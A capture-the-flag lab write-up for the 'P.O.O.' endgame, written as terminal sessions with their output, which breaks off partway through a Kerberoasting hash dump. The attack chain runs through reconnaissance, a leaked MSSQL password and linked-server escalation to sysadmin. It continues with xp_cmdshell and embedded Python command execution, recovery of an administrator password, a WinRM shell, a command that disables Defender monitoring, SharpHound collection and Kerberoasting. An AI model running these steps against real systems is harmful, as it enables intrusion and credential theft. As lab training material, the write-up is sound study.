---
description: Endgame Professional Offensive Operations (P.O.O.)
---

# P.O.O

## Information

<table data-header-hidden><thead><tr><th width="330">Name</th><th align="right"></th></tr></thead><tbody><tr><td>Name</td><td align="right"><img src="../../.gitbook/assets/image (56).png" alt=""></td></tr><tr><td>Hosts</td><td align="right">POO-DC <img src="../../.gitbook/assets/image (54).png" alt="" data-size="line"><br>POO-Compatibility <img src="../../.gitbook/assets/image (55).png" alt="" data-size="line"></td></tr></tbody></table>

## Recon

```apacheconf
msplmee@kali:~/HTB/Endgames/P.O.O$ nmap -sT -p- --min-rate 10000 10.13.38.11 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-25 03:57 EDT
Nmap scan report for 10.13.38.11
Host is up (0.32s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
1433/tcp open  ms-sql-s

Nmap done: 1 IP address (1 host up) scanned in 76.92 seconds
                                                                                                                                                                                             
msplmee@kali:~/HTB/Endgames/P.O.O$ nmap -p 80,1433 -sC -sV 10.13.38.11   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-25 03:59 EDT
Nmap scan report for 10.13.38.11
Host is up (0.31s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.2027.00; RTM+
| ms-sql-info: 
|   10.13.38.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM+
|       number: 14.00.2027.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: true
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.13.38.11:1433: 
|     Target_Name: POO
|     NetBIOS_Domain_Name: POO
|     NetBIOS_Computer_Name: COMPATIBILITY
|     DNS_Domain_Name: intranet.poo
|     DNS_Computer_Name: COMPATIBILITY.intranet.poo
|     DNS_Tree_Name: intranet.poo
|_    Product_Version: 10.0.17763
|_ssl-date: 2023-09-25T08:00:03+00:00; +11s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-09-13T12:49:10
|_Not valid after:  2053-09-13T12:49:10
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 10s, deviation: 0s, median: 10s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.81 seconds
```

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

```
msplmee@kali:~$ feroxbuster -u http://10.13.38.11 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 50 -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.13.38.11
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       32l       55w      703c http://10.13.38.11/
401      GET       29l      100w     1293c http://10.13.38.11/admin
301      GET        2l       10w      149c http://10.13.38.11/images => http://10.13.38.11/images/
301      GET        2l       10w      150c http://10.13.38.11/plugins => http://10.13.38.11/plugins/
301      GET        2l       10w      152c http://10.13.38.11/templates => http://10.13.38.11/templates/
301      GET        2l       10w      149c http://10.13.38.11/themes => http://10.13.38.11/themes/
301      GET        2l       10w      145c http://10.13.38.11/js => http://10.13.38.11/js/
301      GET        2l       10w      150c http://10.13.38.11/uploads => http://10.13.38.11/uploads/
301      GET        2l       10w      146c http://10.13.38.11/dev => http://10.13.38.11/dev/
301      GET        2l       10w      150c http://10.13.38.11/widgets => http://10.13.38.11/widgets/
301      GET        2l       10w      151c http://10.13.38.11/meta-inf => http://10.13.38.11/meta-inf/
404      GET        0l        0w     1245c http://10.13.38.11/stellent
301      GET        2l       10w      155c http://10.13.38.11/new%20folder => http://10.13.38.11/new%20folder/
400      GET        6l       26w      324c http://10.13.38.11/error%1F_log
[####################] - 6m     56163/56163   0s      found:14      errors:0      
[####################] - 6m     56163/56163   139/s   http://10.13.38.11/
```

```
msplmee@kali:~/HTB/Endgames/P.O.O$ nikto -h 10.13.38.11
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.13.38.11
+ Target Hostname:    10.13.38.11
+ Target Port:        80
+ Start Time:         2023-09-25 04:40:33 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ OPTIONS: Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ /.DS_Store: Apache on Mac OSX will serve the .DS_Store file, which contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1446
+ 8254 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2023-09-25 05:26:38 (GMT-4) (2765 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
msplmee@kali:~/HTB/Endgames/P.O.O/DS_Walk$ python ds_walk.py -u http://10.13.38.11
[!] .ds_store file is present on the webserver.
[+] Enumerating directories based on .ds_server file:
----------------------------
[!] http://10.13.38.11/admin
[!] http://10.13.38.11/dev
[!] http://10.13.38.11/iisstart.htm
[!] http://10.13.38.11/Images
[!] http://10.13.38.11/JS
[!] http://10.13.38.11/META-INF
[!] http://10.13.38.11/New folder
[!] http://10.13.38.11/New folder (2)
[!] http://10.13.38.11/Plugins
[!] http://10.13.38.11/Templates
[!] http://10.13.38.11/Themes
[!] http://10.13.38.11/Uploads
[!] http://10.13.38.11/web.config
[!] http://10.13.38.11/Widgets
----------------------------
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc
----------------------------
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/core
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/include
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/src
----------------------------
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/core
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/include
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/src
----------------------------
[!] http://10.13.38.11/Images/buttons
[!] http://10.13.38.11/Images/icons
[!] http://10.13.38.11/Images/iisstart.png
----------------------------
[!] http://10.13.38.11/JS/custom
----------------------------
[!] http://10.13.38.11/Themes/default
----------------------------
[!] http://10.13.38.11/Widgets/CalendarEvents
[!] http://10.13.38.11/Widgets/Framework
[!] http://10.13.38.11/Widgets/Menu
[!] http://10.13.38.11/Widgets/Notifications
----------------------------
[!] http://10.13.38.11/Widgets/Framework/Layouts
----------------------------
[!] http://10.13.38.11/Widgets/Framework/Layouts/custom
[!] http://10.13.38.11/Widgets/Framework/Layouts/default
----------------------------
[*] Finished traversing. No remaining .ds_store files present.
[*] Cleaning up .ds_store files saved to disk.
```

```
msplmee@kali:~/HTB/Endgames/P.O.O$ python iis_shortname_scan.py http://10.13.38.11
Server is vulnerable, please wait, scanning...
[+] /d~1.*      [scan in progress]
[+] /t~1.*      [scan in progress]
[+] /n~1.*      [scan in progress]
[+] /w~1.*      [scan in progress]
[+] /ds~1.*     [scan in progress]
[+] /te~1.*     [scan in progress]
[+] /tr~1.*     [scan in progress]
[+] /ne~1.*     [scan in progress]
[+] /we~1.*     [scan in progress]
[+] /ds_~1.*    [scan in progress]
[+] /tem~1.*    [scan in progress]
[+] /tra~1.*    [scan in progress]
[+] /new~1.*    [scan in progress]
[+] /web~1.*    [scan in progress]
[+] /ds_s~1.*   [scan in progress]
[+] /temp~1.*   [scan in progress]
[+] /tras~1.*   [scan in progress]
[+] /newf~1.*   [scan in progress]
[+] /ds_st~1.*  [scan in progress]
[+] /templ~1.*  [scan in progress]
[+] /trash~1.*  [scan in progress]
[+] /newfo~1.*  [scan in progress]
[+] /ds_sto~1.* [scan in progress]
[+] /templa~1.* [scan in progress]
[+] /trashe~1.* [scan in progress]
[+] /newfol~1.* [scan in progress]
[+] /ds_sto~1   [scan in progress]
[+] Directory /ds_sto~1 [Done]
[+] /templa~1   [scan in progress]
[+] Directory /templa~1 [Done]
[+] /trashe~1   [scan in progress]
[+] Directory /trashe~1 [Done]
[+] /newfol~1   [scan in progress]
[+] Directory /newfol~1 [Done]
----------------------------------------------------------------
Dir:  /ds_sto~1
Dir:  /templa~1
Dir:  /trashe~1
Dir:  /newfol~1
----------------------------------------------------------------
4 Directories, 0 Files found in total
Note that * is a wildcard, matches any character zero or more times.
```

```
msplmee@kali:~/HTB/Endgames/P.O.O$ python iis_shortname_scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db 
Server is vulnerable, please wait, scanning...
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/p~1.*      [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/po~1.*     [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo~1.*    [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_~1.*   [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_c~1.*  [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.* [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.t*        [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.tx*       [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*      [scan in progress]
[+] File /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt* [Done]
----------------------------------------------------------------
File: /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*
----------------------------------------------------------------
0 Directories, 1 Files found in total
Note that * is a wildcard, matches any character zero or more times.
```

```
msplmee@kali:~/HTB/Endgames/P.O.O$  wfuzz -c -w co_fuzz.txt -u http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt --hc 404
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt
Total requests: 2351

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000097:   200        6 L      7 W        142 Ch      "connection"                                                                                                                

Total time: 83.46073
Processed Requests: 2351
Filtered Requests: 2350
Requests/sec.: 28.16893
```

```
msplmee@kali:~/HTB/Endgames/P.O.O$ curl -s http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_connection.txt
SERVER=10.13.38.11
USERID=external_user
DBNAME=POO_PUBLIC
USERPWD=#p00Public3xt3rnalUs3r#

Flag : POO{fcfb0767f5bd3cbc22f40ff5011ad555}
```

## Huh?!

```
msplmee@kali:~/HTB/Endgames/P.O.O$ mssqlclient.py external_user:#p00Public3xt3rnalUs3r#@10.13.38.11
Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'master'.
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 7235) 
[!] Press help for extra shell commands
SQL (external_user  external_user@master)> select suser_name();
                
-------------   
external_user   

SQL (external_user  external_user@master)> select name,sysadmin from syslogins;
name            sysadmin   
-------------   --------   
sa                     1   

external_user          0   

SQL (external_user  external_user@master)> select srvname,isremote from sysservers;
srvname                    isremote   
------------------------   --------   
COMPATIBILITY\POO_PUBLIC          1   

COMPATIBILITY\POO_CONFIG          0   

SQL (external_user  external_user@master)> EXEC ('select current_user') at [COMPATIBILITY\POO_CONFIG];
                
-------------   
internal_user   

SQL (external_user  external_user@master)> EXEC ('select name,sysadmin from syslogins') at [COMPATIBILITY\POO_CONFIG];
name            sysadmin   
-------------   --------   
sa                     1   

internal_user          0   

SQL (external_user  external_user@master)> EXEC ('select srvname,isremote from sysservers') at [COMPATIBILITY\POO_CONFIG];
srvname                    isremote   
------------------------   --------   
COMPATIBILITY\POO_CONFIG          1   

COMPATIBILITY\POO_PUBLIC          0   

SQL (external_user  external_user@master)> EXEC ('EXEC (''select suser_name();'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
     
--   
sa 

SQL (external_user  external_user@master)> EXEC ('EXEC (''EXEC sp_addlogin ''''msplm'''', ''''abc123!'''''') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];

SQL (external_user  external_user@master)> EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''msplm'''', ''''sysadmin'''''') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];

msplmee@kali:~/HTB/Endgames/P.O.O$ mssqlclient.py 'msplm:abc123!@10.13.38.11'                    
Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'master'.
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 7235) 
[!] Press help for extra shell commands
SQL (msplm  dbo@master)> select name from sysdatabases;
name         
----------   
master       

tempdb       

model        

msdb         

POO_PUBLIC   

flag         

SQL (msplm  dbo@master)> select table_name,table_schema from flag.INFORMATION_SCHEMA.TABLES;
table_name   table_schema   
----------   ------------   
flag         dbo            

SQL (msplm  dbo@master)> select * from flag.dbo.flag;
flag                                       
----------------------------------------   
b'POO{88d829eb39f2d11697e689d779810d42}'
```

## BackTrack

```
SQL (msplm  dbo@master)> xp_cmdshell whoami
output                        
---------------------------   
nt service\mssql$poo_public   

NULL                          

SQL (msplm  dbo@master)> xp_cmdshell type C:\inetpub\wwwroot\web.config
output              
-----------------   
Access is denied.   

NULL

SQL (msplm  dbo@master)> EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
compatibility\poo_public01

Express Edition will continue to be enforced.
SQL (msplm  dbo@master)> EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("type \inetpub\wwwroot\web.config");';
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <staticContent>
            <mimeMap
                fileExtension=".DS_Store"
                mimeType="application/octet-stream"
            />
        </staticContent>
        <!--
        <authentication mode="Forms">
            <forms name="login" loginUrl="/admin">
                <credentials passwordFormat = "Clear">
                    <user 
                        name="Administrator" 
                        password="EverybodyWantsToWorkAtP.O.O."
                    />
                </credentials>
            </forms>
        </authentication>
        -->
    </system.webServer>
</configuration>

Express Edition will continue to be enforced.
```

```
msplmee@kali:~/HTB/Endgames/P.O.O$ curl -s http://administrator:EverybodyWantsToWorkAtP.O.O.@10.13.38.11/admin/
"I can't go back to yesterday, because i was a different person then..."<br>
- Alice in Wonderland<br>
<br>
Flag : POO{4882bd2ccfd4b5318978540d9843729f}
```

## Foothold

```
SQL (msplm  dbo@master)> xp_cmdshell netstat -anop tcp
output                                                                        
---------------------------------------------------------------------------   
NULL                                                                          

Active Connections                                                            

NULL                                                                          

  Proto  Local Address          Foreign Address        State           PID    

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4      

  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       912    

  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4      

  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       5188   

  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4      

  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4      

  TCP    0.0.0.0:41433          0.0.0.0:0              LISTENING       5200   

  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4      

  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       492    

  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1136   

  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1576   

  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       644    

  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2512   

  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       644    

  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       636    

  TCP    10.13.38.11:80         10.10.14.5:34890       ESTABLISHED     4      

  TCP    10.13.38.11:139        0.0.0.0:0              LISTENING       4      

  TCP    10.13.38.11:1433       10.10.14.5:44766       ESTABLISHED     5188   

  TCP    127.0.0.1:49676        0.0.0.0:0              LISTENING       5188   

  TCP    127.0.0.1:50280        0.0.0.0:0              LISTENING       5188   

  TCP    127.0.0.1:50311        0.0.0.0:0              LISTENING       5200   

  TCP    172.20.128.101:139     0.0.0.0:0              LISTENING       4      

  TCP    172.20.128.101:51250   172.20.128.53:445      ESTABLISHED     4      

  TCP    172.20.128.101:51255   172.20.128.53:445      ESTABLISHED     4      

  TCP    172.20.128.101:51256   172.20.128.53:445      ESTABLISHED     4      

  TCP    172.20.128.101:51257   172.20.128.53:445      ESTABLISHED     4      

NULL
```

```
SQL (msplm  dbo@master)> xp_cmdshell ipconfig
output                                                                 
--------------------------------------------------------------------   
NULL                                                                   

Windows IP Configuration                                               

NULL                                                                   

NULL                                                                   

Ethernet adapter Ethernet1:                                            

NULL                                                                   

   Connection-specific DNS Suffix  . :                                 

   IPv4 Address. . . . . . . . . . . : 172.20.128.101                  

   Subnet Mask . . . . . . . . . . . : 255.255.255.0                   

   Default Gateway . . . . . . . . . :                                 

NULL                                                                   

Ethernet adapter Ethernet0:                                            

NULL                                                                   

   Connection-specific DNS Suffix  . : htb                             

   IPv6 Address. . . . . . . . . . . : dead:beef::206                  

   IPv6 Address. . . . . . . . . . . : dead:beef::1001                 

   IPv6 Address. . . . . . . . . . . : dead:beef::1515:41a:3b34:3e44   

   Link-local IPv6 Address . . . . . : fe80::1515:41a:3b34:3e44%5      

   IPv4 Address. . . . . . . . . . . : 10.13.38.11                     

   Subnet Mask . . . . . . . . . . . : 255.255.255.0                   

   Default Gateway . . . . . . . . . : dead:beef::1                    

                                       fe80::250:56ff:feb9:deb9%5      

                                       10.13.38.2                      

NULL
```

```
msplmee@kali:~$  nmap -p- -6 --min-rate 10000 dead:beef::1001    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-25 05:10 EDT
Nmap scan report for dead:beef::1001
Host is up (0.32s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
1433/tcp open  ms-sql-s
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 53.45 seconds
```

```
SQL (msplm  dbo@master)> EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("hostname");';
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
COMPATIBILITY

Express Edition will continue to be enforced.
```

```
msplmee@kali:~$ evil-winrm -i compatibility -u administrator -p 'EverybodyWantsToWorkAtP.O.O.'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat flag.txt
POO{ff87c4fe10e2ef096f9a96a01c646f8f}
```

## p00ned

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /home/kali/Downloads/BloodHound.exe C:\Users\Public\bloodhound.exe
Info: Uploading /home/kali/Downloads/BloodHound.exe to C:\Users\Public\bloodhound.exe

Progress: 18% : |▒░░░░░░░░░|          
Progress: 19% : |▒░░░░░░░░░|          
Progress: 28% : |▓▒░░░░░░░░|             
                                                             
Data: 168724480 bytes of 168724480 bytes copied

Info: Upload successful!
```

```
SQL (msplm  dbo@master)> xp_cmdshell C:\Users\Public\hound.exe -C All --outputdirectory C:\Users\Public

output                                                                             
--------------------------------------------------------------------------------   
2023-09-26T06:16:29.5629808+03:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound   

2023-09-26T06:16:29.7661039+03:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote   

2023-09-26T06:16:29.7973928+03:00|INFORMATION|Initializing SharpHound at 6:16 AM on 9/26/2023   

2023-09-26T06:16:30.0786058+03:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for intranet.poo : DC.intranet.poo   

2023-09-26T06:17:18.6411354+03:00|INFORMATION|Loaded cache with stats: 59 ID to type mappings.   

 61 name to SID mappings.                                                          

 1 machine sid mappings.                                                           

 2 sid to domain mappings.                                                         

 1 global catalog mappings.                                                        

2023-09-26T06:17:18.6411354+03:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote   

2023-09-26T06:17:18.8286386+03:00|INFORMATION|Beginning LDAP search for intranet.poo   

2023-09-26T06:17:18.8911211+03:00|INFORMATION|Producer has finished, closing LDAP channel   

2023-09-26T06:17:18.8911211+03:00|INFORMATION|LDAP channel closed, waiting for consumers   

2023-09-26T06:17:49.7192480+03:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 39 MB RAM   

2023-09-26T06:18:02.0629943+03:00|INFORMATION|Consumers finished, closing output channel   

2023-09-26T06:18:02.1098615+03:00|INFORMATION|Output channel closed, waiting for output task to complete   

Closing writers                                                                    

2023-09-26T06:18:02.2661246+03:00|INFORMATION|Status: 102 objects finished (+102 2.372093)/s -- Using 43 MB RAM   

2023-09-26T06:18:02.2661246+03:00|INFORMATION|Enumeration finished in 00:00:43.4408275   

2023-09-26T06:18:02.3755156+03:00|INFORMATION|Saving cache with stats: 59 ID to type mappings.   

 61 name to SID mappings.                                                          

 1 machine sid mappings.                                                           

 2 sid to domain mappings.                                                         

 1 global catalog mappings.                                                        

2023-09-26T06:18:02.3918659+03:00|INFORMATION|SharpHound Enumeration Completed at 6:18 AM on 9/26/2023! Happy Graphing!   

NULL 
```

```
*Evil-WinRM* PS C:\Users\Public> download C:\Users\Public\20230926061629_BloodHound.zip /home/kali/Downloads/bloodhound_poo.zip
Info: Downloading C:\Users\Public\20230926061629_BloodHound.zip to /home/kali/Downloads/bloodhound_poo.zip

                                                             
Info: Download successful!
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

```
*Evil-WinRM* PS C:\Users\Public> upload /home/kali/Downloads/Invoke-Kerberoast.ps1 
Info: Uploading /home/kali/Downloads/Invoke-Kerberoast.ps1 to C:\Users\Public\Invoke-Kerberoast.ps1

                                                             
Data: 62464 bytes of 62464 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\Public> Set-MpPreference -DisableRealtimeMonitoring $true

```

```
SQL (msplm  dbo@master)> xp_cmdshell powershell -c import-module C:\Users\Public\Invoke-Kerberoast.ps1; Invoke-Kerberoast -outputformat hashcat
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               

NULL                                                                               

TicketByteHexStream  :                                                             

Hash                 : $krb5tgs$23$*p00_hr$intranet.poo$HR_peoplesoft/intranet.poo:1433*$F5A1AE1E3B6AB08CE57A99807C7CEE   

                       38$ED40B40BF85FE97ABCDC8D803E91A3EF6702B1FAA5BFCD43E0E9C3C1EB25F88C95B50F1F5AC0D8883DD4DEACE5EFB   

                       D8C139F98AEBDF31DD3F87268B4D6C4A0AF5C99D963BF8CE73D121741F3A067400B73B914D9779CDDB43EB327959A239   

                       AD7678F28533019411F684AED7D7E094F6516A599EACB8FD862CC7E62662B7147E5C7C70AB9C55336B26B488EA4B0EB1   

                       D48217FED08D27F03488D8CF6FDB00F19271C1ED8F752A31994B845710ABDCDF71E08F5FDEE176781B90C932C012CFDA   

                       4158BF632C948252E3E109E2CC3B2256ECEB2F4AA2885DA2FB7146F91054B2A47AEEC5610CBE8DDE89FCB1BA5A2C46F1   

                       A94969B1FF36AFD7C0ECB6DA2CB1ADDBFD8E105EEF7C3A0A35A51EE3878359CD33EAA2643896EE2A64D15C6E10D8CF45   

                       F74B4238044C915BAE15E9CA1789915F16FE531369E9EE2EFC825158C5427FB6A9D188B663B9EACE446F89A70D986E32   

                       32ABB5B091A30015A26F1A4E23BEF6B3312AC28E1A06D3AF251361859D1D5D5962EC40AC81A2B8BE08DC4CF7226CF801   

                       8723D0764DED8AA878E51E7C1C7C6BAEB3C345D89188A26BC94BB7E52D73FFB3AF7E937C5E311B7B42A1C04D46413F83   

                       E9C89D6954E221D2C06A16D7C81C1DAAF4340F85F500A2C57AFE63EA8B680336F386E6F404CA0DF95B0B5450C586A879   

                       6CCD51C171DB608D800A71F64CEBD3E69ED03C01447725374E3D75E20FF75E01FA3416E8E442F83B87B2FBCA48D352D8   

                       5FEF7720683A5BB74C75540A110DD8931DE06FF23D644FAA8561F887D206ECF8A2C708EB682C119762AB69A64FDFAD66   

                       5FFBDAC2B6454194D75F6B3A3247947352A935F967D25917CCE95CB58C4EDD73F7F1D7CF8AC4BC9F239CAFE41F9ADB49   

                       3476299434BC4FAFAE774520B713AA61ACF1DEB05E33CD6C951B0F4189B84885025BB1C422F1E772CEBD6C100244F316   

                       6B53E707C1B7214F88D55A475B07E8644989F172E2954A23EDA49AC5A24267573831E3B599473C370A0BD5B09CA7A060   

                       2384DB1778C84950908CA62A498E3B04C688AA132C357B86B483899AC0EB423EC5A486E6148F1A4D35B789509840471A   

                       93C08AA6424E38965CAD29AD5E94F7FE7AE5F8B6C82A9BBBA408C1A1E4054D8D2781A31348A0856ACD0569AA78F62761   

                       AEE6F5F1FA5605ACF0D01AA6E65EE08525D3690660E172A046420517B7C39EFA8CC481BD1FC0F17248AA9CED8E129F86   

                       68C1C402068048398CFC6674525AF645B82F09D72C419257540BB9AFEA047DC013D323A012118C6ECC3F01A6B469C819   

                       13791F1E889C29704B471BC0926A8F0AEC17EAF6EFB28ABC5F417CCF6092588DC9D38157D98484E04AAFEF73680CBCA0   

                       B3FC237EAD2AFCCA77EEA2928956C0B8C19AC610F2EAD20B239176A8DF4B1D5EF0269AEAD6D348CE5C224517C410DAB2   

                       129E2FEDF0977B36C1AD938732494E382F8ED9A9781D36E5B7E1291444935DF544CB0E3EED6A1170A194C0547DC2E   

SamAccountName       : p00_hr                                                      

DistinguishedName    : CN=p00_hr,CN=Users,DC=intranet,DC=poo                       

ServicePrincipalName : HR_peoplesoft/intranet.poo:1433                             

NULL                                                                               

TicketByteHexStream  :                                                             

Hash                 : $krb5tgs$23$*p00_adm$intranet.poo$cyber_audit/intranet.poo:443*$5C68D2DEDDB5A921C7DD69A2D230D1D6   

                       $1883C5839B7F0EE5CC513A27D23404F26E5B1AB7423220CAAE3882717BB1302A60A41DDDB86D8C006500D5D0F46992E   

                       C656D884FA5049A8CD436C7B6778702FBF108FE6D7E4809BA4D4B1699F029E48167AD888DE4005E9AE18BDC5A96CAE01   

                       F3E3B8AA526B78867A550F8395BE9D003FBDF7A8895AF626BCFCC5F798D5931CCEC59E58FD69E98E5E44CFDB271A64FD   

                       4B3705B6F0DB8A6592972949105373D565C54063F0843C9007CEA27CB329432EA4B5DF64AFA1BB8051F8D282C725B89C   

